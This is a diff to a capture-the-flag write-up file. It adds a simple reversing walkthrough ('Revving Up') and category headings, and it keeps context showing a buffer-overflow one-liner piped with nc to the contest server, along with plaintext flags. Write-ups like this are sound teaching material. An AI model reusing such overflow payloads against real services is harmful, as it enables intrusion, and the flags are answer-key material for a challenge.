@@ -13,10 +13,10 @@
 |    [Inputter](#inputter)           |   Misc                          | 100   |
 |    [msd](#msd)                     |   Misc                          | 140   |
 
-<hr />
+---
 
 ## Keysar
-#### Binary Exploitation (40 points)
+#### Crypto (40 points)
 
 
 ### Description:
@@ -36,6 +36,7 @@ Flag: ``` actf{yum_delicious_salad} ```
 ---
 
 ## No Canary
+#### Binary Exploitation (50 points)
 
 
 ### Description:
@@ -124,3 +125,47 @@ $ python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00' | nc shell.actf.co 2070
 ```
 
 Flag: ``` actf{that_gosh_darn_canary_got_me_pwned!} ```
+
+---
+
+## Revving Up
+#### Reversing (50 points)
+
+### Description:
+> **Clam wrote a [](program) for his school's cybersecurity club's first rev lecture!<br>
+> Can you get it to give you the flag?<br>
+> You can find it at /problems/2020/revving_up on the shell server, which you can access via the "shell" link at the top of the site.**
+
+> *Hint: Try some google searches for "how to run a file in linux" or "bash for beginners".
+
+### solution:
+We go to the shell server and to the directory given we'll find 2 files flag.txt and revving_up And by: ``` $ file revving_up ``` we know that it's ELF 64-bit and by running it:
+```
+$ ./revving_up
+Congratulations on running the binary!
+Now there are a few more things to tend to.
+Please type "give flag" (without the quotes).
+
+```
+After we type "give flag":
+```
+give flag
+Good job!
+Now run the program with a command line argument of "banana" and you'll be done!
+```
+So we do as it's said:
+```
+$ ./revving_up banana
+Congratulations on running the binary!
+Now there are a few more things to tend to.
+Please type "give flag" (without the quotes).
+give flag
+Good job!
+Well I think it's about time you got the flag!
+actf{g3tting_4_h4ng_0f_l1nux_4nd_b4sh}
+```
+So easy, right ?!!
+
+Flag: ``` actf{g3tting_4_h4ng_0f_l1nux_4nd_b4sh} ```
+
+---
